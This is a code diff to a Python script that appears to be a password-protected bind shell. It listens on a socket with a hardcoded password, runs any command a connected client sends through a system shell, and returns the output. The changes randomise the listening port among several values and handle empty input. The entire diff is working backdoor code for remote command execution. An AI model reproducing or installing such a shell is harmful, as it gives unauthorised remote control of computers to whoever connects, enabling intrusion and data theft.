@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import os
+import random
 
 
 def lookForConnection(server):
@@ -26,7 +27,8 @@ def checkPass(password, client, client_addr):
 
 HOSTNAME = socket.gethostname()
 HOST = socket.gethostbyname(HOSTNAME)
-PORT = 4444
+POTENTIAL_PORTS = ['4444','4200','3600','4000','4400']
+PORT = random.choice(POTENTIAL_PORTS)
 real_password = "helpme"
 passwords_match = False
 server = socket.socket()
@@ -49,7 +51,7 @@ while passwords_match == True:
         client.close()
         password, client, client_addr = lookForConnection(server)
         passwords_match = checkPass(password, client, client_addr)
-    elif command[:2] == "cd" or command[:5] == "chdir":
+    elif command[:2] == "cd" or command[:5] == "chdir" or command == "":
         if command[:2] == "cd":
             try:
                 os.chdir(command[3:])
@@ -57,13 +59,19 @@ while passwords_match == True:
                 print("Sending response...")
             except OSError:
                 print("cd did not work")
-        else:
+        elif command[:5] == "chdir":
             try:
                 os.chdir(command[6:])
                 client.send(("Moved Directories").encode())
                 print("Sending response...")
             except OSError:
                 print("cd did not work")
+        else:
+            try:
+                client.send(("Nothing was typed").encode())
+                print("Sending response...")
+            except:
+                print("Nothing was typed")
     else:
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
